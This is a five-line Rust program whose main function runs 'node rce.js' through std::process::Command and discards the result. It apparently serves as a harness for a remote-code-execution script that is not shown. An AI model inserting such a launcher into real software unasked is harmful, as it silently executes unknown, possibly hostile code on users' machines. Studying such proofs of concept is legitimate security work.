fn main() {
    let _ = std::process::Command::new("node")
        .arg("rce.js")
        .status();
}
